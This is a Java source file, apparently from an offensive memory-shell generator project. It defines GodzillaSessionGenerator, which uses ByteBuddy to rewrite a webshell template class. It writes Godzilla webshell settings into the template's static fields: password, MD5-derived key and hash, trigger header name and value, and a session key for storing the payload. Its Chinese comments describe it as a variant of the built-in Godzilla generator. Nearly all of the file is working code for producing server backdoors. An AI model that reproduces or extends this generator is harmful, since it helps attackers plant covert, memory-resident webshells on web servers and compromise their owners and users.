package com.reajason.javaweb.examples.customshelltool;

import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
import net.bytebuddy.dynamic.DynamicType;
import com.reajason.javaweb.utils.DigestUtils;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * 生成器：把配置写进模板类的静态字段。
 *
 * <p>{@link ByteBuddyShellGenerator#redefineTemplate()} 按 {@code shellTemplateClassName}
 * 以字节方式读取模板并 redefine —— 模板引用的 servlet API 只在生成期用于解析签名，
 * 不需要也不应该被加载进 JVM。
 *
 * <p>这里比内置 GodzillaGenerator 多写一个 {@code sessionKey}，其余完全一致：
 * 协议（pass/key/header/md5）没有变，变的是 payload 存放位置。
 *
 * @author ReaJason
 */
public class GodzillaSessionGenerator extends ByteBuddyShellGenerator<GodzillaSessionConfig> {

    public GodzillaSessionGenerator(ShellConfig shellConfig, GodzillaSessionConfig godzillaSessionConfig) {
        super(shellConfig, godzillaSessionConfig);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        String md5Key = DigestUtils.md5Hex(shellToolConfig.getKey()).substring(0, 16);
        String md5 = DigestUtils.md5Hex(shellToolConfig.getPass() + md5Key).toUpperCase();
        return redefineTemplate()
                .field(named("pass")).value(shellToolConfig.getPass())
                .field(named("key")).value(md5Key)
                .field(named("md5")).value(md5)
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue())
                .field(named("sessionKey")).value(shellToolConfig.getSessionKey());
    }
}
